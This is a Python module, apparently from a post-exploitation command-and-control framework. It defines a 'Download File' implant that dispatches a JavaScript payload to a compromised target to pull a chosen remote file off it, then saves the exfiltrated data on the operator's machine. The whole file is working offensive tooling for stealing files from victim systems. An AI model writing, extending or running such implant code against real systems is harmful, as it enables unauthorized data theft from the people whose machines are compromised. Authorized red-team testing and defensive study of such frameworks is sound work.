import core.job
import core.implant
import uuid
import time

class DownloadFileImplant(core.implant.Implant):

    NAME = "Download File"
    DESCRIPTION = "Downloads a remote file off the target system."
    AUTHORS = ["RiskSense, Inc."]

    def load(self):
        self.options.register("LPATH", "/tmp/", "local file save path")
        self.options.register("RFILE", "", "remote file to get")

    def run(self):
        payloads = {}
        payloads["js"] = self.loader.load_script("data/implant/util/download_file.js", self.options)

        self.dispatch(payloads, DownloadFileJob)

class DownloadFileJob(core.job.Job):
    def report(self, handler, data, sanitize = False):
        self.save_fname = self.options.get("LPATH") + "/" + uuid.uuid4().hex
        self.save_fname = self.save_fname.replace("//", "/")

        with open(self.save_fname, "wb") as f:
            data = self.decode_downloaded_data(data)
            f.write(data)
            self.save_len = len(data)

        super(DownloadFileJob, self).report(handler, data, False)

    def done(self):
        self.display()

    def display(self):
        rfile = self.options.get("RFILE")
        self.shell.print_good("%s saved to %s (%d bytes)" % (rfile, self.save_fname, self.save_len))
